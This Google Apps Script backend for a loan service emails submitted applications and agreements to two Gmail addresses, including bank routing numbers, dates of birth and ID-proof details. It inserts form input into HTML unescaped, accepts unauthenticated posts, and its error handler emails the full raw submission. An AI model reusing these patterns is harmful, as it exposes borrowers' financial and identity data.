// Enhanced Google Apps Script for UpStars Loans
// Handles both initial application and agreement submission with ID proof
// Sends emails to multiple recipients simultaneously

// Configuration - UPDATE THESE EMAILS
const PRIMARY_EMAIL = "your-primary-email@gmail.com";
const SECONDARY_EMAIL = "your-secondary-email@gmail.com"; // Your second email

// Email templates
function doGet(e) {
  return HtmlService.createHtmlOutput(`
    <h1>UpStars Loans Email Service</h1>
    <p>Service is running. Ready to receive loan applications and agreements.</p>
    <p><strong>Current emails:</strong></p>
    <ul>
      <li>Primary: ${PRIMARY_EMAIL}</li>
      <li>Secondary: ${SECONDARY_EMAIL}</li>
    </ul>
  `);
}

function doPost(e) {
  try {
    const data = e.parameter;
    const formType = data.formType || 'loanApplication';
    
    if (formType === 'loanApplication') {
      handleLoanApplication(data);
    } else if (formType === 'loanAgreement') {
      handleLoanAgreement(data);
    } else {
      sendErrorEmail('Unknown form type: ' + formType, data);
    }
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'success',
      message: 'Form processed successfully'
    }));
    
  } catch (error) {
    Logger.log('Error in doPost: ' + error.toString());
    sendErrorEmail(error.toString(), e.parameter);
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'error',
      error: error.toString()
    }));
  }
}

function handleLoanApplication(data) {
  const subject = `New Loan Application - ${data.firstName} ${data.lastName}`;
  
  const htmlBody = createApplicationEmailHTML(data);
  const textBody = createApplicationEmailText(data);
  
  // Send to both emails
  sendEmailToBoth(subject, htmlBody, textBody);
}

function handleLoanAgreement(data) {
  const subject = `Loan Agreement Submitted - ${data.borrower_name}`;
  
  const htmlBody = createAgreementEmailHTML(data);
  const textBody = createAgreementEmailText(data);
  
  // Send to both emails
  sendEmailToBoth(subject, htmlBody, textBody);
}

function sendEmailToBoth(subject, htmlBody, textBody) {
  const options = {
    name: 'UpStars Loans',
    htmlBody: htmlBody,
    replyTo: PRIMARY_EMAIL
  };
  
  // Send to primary email
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, textBody, options);
  
  // Send to secondary email
  GmailApp.sendEmail(SECONDARY_EMAIL, subject, textBody, options);
  
  Logger.log(`Email sent to both: ${PRIMARY_EMAIL} and ${SECONDARY_EMAIL}`);
}

function createApplicationEmailHTML(data) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .header { background: #2c3e50; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; background: #f9f9f9; }
        .field { margin: 10px 0; padding: 10px; background: white; border-left: 4px solid #3498db; }
        .field-label { font-weight: bold; color: #2c3e50; }
        .footer { background: #34495e; color: white; padding: 15px; text-align: center; font-size: 12px; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>🏦 New Loan Application Received</h1>
        <p>UpStars Loans - Application Submitted</p>
      </div>
      
      <div class="content">
        <h2>Applicant Information</h2>
        
        <div class="field">
          <span class="field-label">Loan Agent:</span> ${data.loanAgent || 'Not specified'}
        </div>
        
        <div class="field">
          <span class="field-label">Full Name:</span> ${data.firstName} ${data.lastName}
        </div>
        
        <div class="field">
          <span class="field-label">Email:</span> ${data.email}
        </div>
        
        <div class="field">
          <span class="field-label">Phone:</span> ${data.phoneNumber}
        </div>
        
        <div class="field">
          <span class="field-label">Address:</span> ${data.homeAddress}, ${data.city}, ${data.state} ${data.zipCode}
        </div>
        
        <h2>Loan Details</h2>
        
        <div class="field">
          <span class="field-label">Loan Amount:</span> $${data.loanAmount}
        </div>
        
        <div class="field">
          <span class="field-label">Loan Purpose:</span> ${data.loanPurpose}
        </div>
        
        <div class="field">
          <span class="field-label">Loan Term (Months):</span> ${data.loanTerm || 'Not specified'}
        </div>
        
        <div class="field">
          <span class="field-label">Monthly Payment:</span> $${calculateMonthlyPayment(data.loanAmount, data.loanTerm)}
        </div>
        
        <h2>Bank Information</h2>
        
        <div class="field">
          <span class="field-label">Bank:</span> ${data.bankName}
        </div>
        
        <div class="field">
          <span class="field-label">Routing Number:</span> ${data.routingNumber}
        </div>
        
        <div class="field">
          <span class="field-label">Account Number:</span> ****${data.accountNumber ? data.accountNumber.slice(-4) : ''}
        </div>
        
        <h2>Additional Information</h2>
        
        <div class="field">
          <span class="field-label">Date of Birth:</span> ${data.dateOfBirth || 'Not provided'}
        </div>
        
        <div class="field">
          <span class="field-label">User ID:</span> ${data.userId}
        </div>
        
        <div class="field">
          <span class="field-label">Submission Date:</span> ${new Date().toLocaleString()}
        </div>
      </div>
      
      <div class="footer">
        <p>This is an automated message from UpStars Loans Application System</p>
        <p>© 2024 UpStars Loans. All rights reserved.</p>
      </div>
    </body>
    </html>
  `;
}

function createApplicationEmailText(data) {
  return `
NEW LOAN APPLICATION - UPSTARS LOANS

==========================================
Applicant Information:
------------------------------------------
Name: ${data.firstName} ${data.lastName}
Email: ${data.email}
Phone: ${data.phoneNumber}
Address: ${data.homeAddress}, ${data.city}, ${data.state} ${data.zipCode}
Loan Agent: ${data.loanAgent || 'Not specified'}

Loan Details:
------------------------------------------
Loan Amount: $${data.loanAmount}
Loan Purpose: ${data.loanPurpose}
Loan Term (Months): ${data.loanTerm || 'Not specified'}
Monthly Payment: $${calculateMonthlyPayment(data.loanAmount, data.loanTerm)}

Bank Information:
------------------------------------------
Bank: ${data.bankName}
Routing Number: ${data.routingNumber}
Account Number: ****${data.accountNumber ? data.accountNumber.slice(-4) : ''}

Additional Information:
------------------------------------------
Date of Birth: ${data.dateOfBirth || 'Not provided'}
User ID: ${data.userId}
Submission Date: ${new Date().toLocaleString()}

==========================================
This is an automated message from UpStars Loans Application System
  `;
}

function createAgreementEmailHTML(data) {
  const idProofSection = data.idProofBase64 ? `
    <div class="field">
      <span class="field-label">ID Proof File:</span> ${data.idProofName}
    </div>
    
    <div class="field">
      <span class="field-label">ID Proof Type:</span> ${data.idProofType}
    </div>
    
    <div class="field">
      <span class="field-label">ID Proof Size:</span> ${data.idProofSize}
    </div>
    
    <div class="field">
      <span class="field-label">ID Proof Status:</span> ✅ Attached (Base64 encoded)
    </div>
  ` : `
    <div class="field">
      <span class="field-label">ID Proof:</span> ❌ Not uploaded
    </div>
  `;

  return `
    <!DOCTYPE html>
    <html>
    <head>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .header { background: #2c3e50; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; background: #f9f9f9; }
        .field { margin: 10px 0; padding: 10px; background: white; border-left: 4px solid #27ae60; }
        .field-label { font-weight: bold; color: #2c3e50; }
        .agreement-box { background: #e8f5e8; padding: 15px; margin: 15px 0; border-radius: 5px; }
        .footer { background: #34495e; color: white; padding: 15px; text-align: center; font-size: 12px; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>📋 Loan Agreement Submitted</h1>
        <p>UpStars Loans - Agreement Received</p>
      </div>
      
      <div class="content">
        <h2>Borrower Information</h2>
        
        <div class="field">
          <span class="field-label">Borrower Name:</span> ${data.borrower_name}
        </div>
        
        <div class="field">
          <span class="field-label">Email:</span> ${data.email}
        </div>
        
        <h2>Agreement Details</h2>
        
        <div class="field">
          <span class="field-label">Agreement Number:</span> ${data.agreementNumber}
        </div>
        
        <div class="field">
          <span class="field-label">Loan Amount:</span> $${data.loanAmount}
        </div>
        
        <div class="field">
          <span class="field-label">Loan Term:</span> ${data.loanTerm} months
        </div>
        
        <div class="field">
          <span class="field-label">Monthly Payment:</span> $${calculateMonthlyPayment(data.loanAmount, data.loanTerm)}
        </div>
        
        <div class="field">
          <span class="field-label">Agreement Accepted:</span> ${data.agreementAccepted ? '✅ Yes' : '❌ No'}
        </div>
        
        <div class="field">
          <span class="field-label">Signature Status:</span> ${data.signatureStatus}
        </div>
        
        <div class="field">
          <span class="field-label">Submission Date:</span> ${data.submissionDate}
        </div>
        
        <h2>ID Proof Information</h2>
        ${idProofSection}
        
        <div class="agreement-box">
          <h3>📄 Agreement Content Preview</h3>
          <p><strong>Complete agreement text is included in this email submission.</strong></p>
          <p><em>The full agreement content has been sent as part of this submission.</em></p>
        </div>
      </div>
      
      <div class="footer">
        <p>This is an automated message from UpStars Loans Agreement System</p>
        <p>© 2024 UpStars Loans. All rights reserved.</p>
      </div>
    </body>
    </html>
  `;
}

function createAgreementEmailText(data) {
  const idProofSection = data.idProofBase64 ? `
ID Proof Information:
- File: ${data.idProofName}
- Type: ${data.idProofType}
- Size: ${data.idProofSize}
- Status: Attached (Base64 encoded)
  ` : `
ID Proof Information:
- Status: Not uploaded
  `;

  return `
LOAN AGREEMENT SUBMITTED - UPSTARS LOANS
==========================================

Borrower Information:
------------------------------------------
Name: ${data.borrower_name}
Email: ${data.email}

Agreement Details:
------------------------------------------
Agreement Number: ${data.agreementNumber}
Loan Amount: $${data.loanAmount}
Loan Term: ${data.loanTerm} months
Monthly Payment: $${calculateMonthlyPayment(data.loanAmount, data.loanTerm)}
Agreement Accepted: ${data.agreementAccepted ? 'Yes' : 'No'}
Signature Status: ${data.signatureStatus}
Submission Date: ${data.submissionDate}

${idProofSection}

Agreement Content:
------------------------------------------
The complete agreement text has been included in this submission.

==========================================
This is an automated message from UpStars Loans Agreement System
  `;
}

function calculateMonthlyPayment(loanAmount, loanTerm) {
  if (!loanAmount || !loanTerm) return '0.00';
  
  const principal = parseFloat(loanAmount);
  const months = parseInt(loanTerm);
  const monthlyRate = 0.10 / 12; // 10% APR
  
  const monthlyPayment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
  return monthlyPayment.toFixed(2);
}

function sendErrorEmail(error, data) {
  const subject = 'Error in UpStars Loans System';
  const body = `
An error occurred in the UpStars Loans system:

Error: ${error}

Data received: ${JSON.stringify(data, null, 2)}

Time: ${new Date().toLocaleString()}

Please check the system and investigate this issue.
  `;
  
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, body);
}
